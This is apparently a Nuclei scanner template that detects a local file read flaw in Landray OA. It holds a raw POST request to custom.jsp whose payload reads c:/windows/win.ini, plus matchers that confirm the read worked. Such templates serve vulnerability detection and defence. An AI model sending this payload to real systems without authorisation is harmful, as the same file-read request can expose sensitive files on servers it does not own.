id: landray-oa-fileread2
info:
  author: pikpikcu
  name: Landray-OA Fileread
  reference: https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
  severity: high
  tags: landray,lfi
requests:
- matchers:
  - regex:
    - for 16-bit app support
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like
    Gecko) Chrome/41.0.2225.0 Safari/537.36

    Connection: close

    Content-Length: 44

    Accept: */*

    Accept-Language: en

    Content-Type: application/x-www-form-urlencoded


    var={"body":{"file":"file:///c://windows/win.ini"}}

    '
